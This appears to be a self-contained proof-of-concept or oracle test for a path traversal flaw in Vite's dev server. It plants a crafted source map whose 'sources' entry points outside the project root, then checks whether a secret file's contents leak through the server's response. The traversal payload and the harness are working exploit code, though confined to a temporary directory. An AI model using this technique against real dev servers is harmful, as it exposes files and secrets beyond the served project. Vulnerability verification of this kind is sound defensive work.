const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');

(async () => {
  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';
  let server;

  const marker = 'vite-map-traversal-' + Date.now() + '-' + Math.random().toString(16).slice(2);
  const base = path.join(os.tmpdir(), marker);
  const root = path.join(base, 'project');
  const depsDir = path.join(root, 'node_modules', '.vite', 'deps');

  try {
    fs.mkdirSync(depsDir, { recursive: true });
    fs.writeFileSync(path.join(root, 'index.html'), '<!doctype html><html><body>ok</body></html>');

    const secretValue = 'TOP_SECRET_' + marker;
    const secretPath = path.join(base, 'outside-secret.txt');
    fs.writeFileSync(secretPath, secretValue);

    const benignMapName = 'benign.js.map';
    const benignSourceName = 'inside-source.ts';
    fs.writeFileSync(path.join(depsDir, benignSourceName), 'export const ok = 1; // ' + marker);
    fs.writeFileSync(
      path.join(depsDir, benignMapName),
      JSON.stringify({ version: 3, file: 'benign.js', sources: [benignSourceName], names: [], mappings: 'AAAA' })
    );

    const maliciousMapName = 'malicious.js.map';
    const traversal = path.relative(depsDir, secretPath).split(path.sep).join('/');
    fs.writeFileSync(
      path.join(depsDir, maliciousMapName),
      JSON.stringify({ version: 3, file: 'malicious.js', sources: [traversal], names: [], mappings: 'AAAA' })
    );

    const vite = require('vite');
    if (!vite || typeof vite.createServer !== 'function') throw new Error('vite.createServer unavailable');

    server = await vite.createServer({
      root,
      logLevel: 'silent',
      appType: 'custom',
      server: { middlewareMode: true },
      optimizeDeps: { noDiscovery: true, force: false }
    });

    const request = (url) => new Promise((resolve, reject) => {
      const req = { method: 'GET', url, headers: {} };
      const res = {
        statusCode: 200,
        headers: {},
        body: '',
        setHeader(k, v) { this.headers[String(k).toLowerCase()] = v; },
        getHeader(k) { return this.headers[String(k).toLowerCase()]; },
        writeHead(code, headers) {
          this.statusCode = code;
          if (headers && typeof headers === 'object') {
            for (const key of Object.keys(headers)) this.setHeader(key, headers[key]);
          }
          return this;
        },
        write(chunk) { if (chunk != null) this.body += String(chunk); },
        end(chunk) {
          if (chunk != null) this.body += String(chunk);
          resolve({ statusCode: this.statusCode || 200, headers: this.headers, body: this.body });
        }
      };

      try {
        server.middlewares.handle(req, res, () => {
          resolve({ statusCode: res.statusCode || 404, headers: res.headers, body: res.body || '' });
        });
      } catch (e) {
        reject(e);
      }
    });

    const benignResp = await request('/node_modules/.vite/deps/' + benignMapName);
    const benignBody = String((benignResp && benignResp.body) || '');
    const benignOk = benignResp && benignResp.statusCode >= 200 && benignResp.statusCode < 300 && benignBody.includes(benignSourceName);
    if (!benignOk) {
      throw new Error('benign failed: status=' + (benignResp ? benignResp.statusCode : 'none') + ' body_preview=' + benignBody.slice(0, 160));
    }

    operation_completed = true;

    let malResp;
    let malErr;
    try {
      malResp = await request('/node_modules/.vite/deps/' + maliciousMapName);
    } catch (e) {
      malErr = e;
    }

    if (malErr) {
      exploit_succeeded = false;
      evidence = 'malicious blocked by exception: ' + (malErr && malErr.message ? malErr.message : String(malErr));
    } else {
      const body = String((malResp && malResp.body) || '');
      const leaked = body.includes(secretValue);
      exploit_succeeded = leaked;
      evidence = 'benign_status=' + benignResp.statusCode + ', mal_status=' + (malResp ? malResp.statusCode : 'none') + ', leaked=' + leaked + ', mal_preview=' + body.slice(0, 160);
    }
  } catch (err) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'setup/benign failure: ' + (err && err.message ? err.message : String(err));
  } finally {
    try { if (server) await server.close(); } catch (_) {}
  }

  console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
})();